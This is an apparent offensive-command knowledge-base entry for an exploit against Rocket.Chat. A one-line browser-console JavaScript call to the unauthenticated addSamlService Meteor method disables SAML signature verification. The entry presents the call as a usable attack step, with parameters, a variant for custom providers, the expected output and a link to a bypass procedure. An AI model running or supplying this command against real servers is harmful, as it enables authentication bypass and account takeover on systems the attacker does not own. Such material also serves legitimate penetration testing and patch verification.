---
id: cmd-uuid-1
data: 'Meteor.call("addSamlService", "Default_cert");'
tags:
  - meteor
  - saml
  - exploit
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:11.228Z'
verified: false
validated: true
submitted: true
---
# meteor-call-addSamlService

## Command

```javascript
Meteor.call("addSamlService", "Default_cert");
```

## Description

This JavaScript command, executed in the browser console on a Rocket.Chat login page, calls the unauthenticated Meteor method to add a SAML service configuration, setting the certificate flag for the 'Default' provider to false and disabling signature verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `addSamlService` | Method name for adding SAML provider settings | Yes |
| `"Default_cert"` | Provider name prefix (e.g., creates SAML_Custom_Default_cert set to false) | Yes |

## Examples

### Basic Usage

```javascript
Meteor.call("addSamlService", "Default_cert");
```

### Advanced Usage

For custom providers, adjust the second parameter:
```javascript
Meteor.call("addSamlService", "CustomProvider_cert");
```

## Expected Output

Successful execution returns no errors in the console; the backend setting is updated silently. Indicator of success: Subsequent SAML responses are accepted without signature validation.

## Related

- [[procedures/Disable-SAML-Signature-Verification-via-addSamlService]]
- [[Rocket.Chat SAML Authentication Bypass via Unauthenticated addSamlService Meteor Method]]
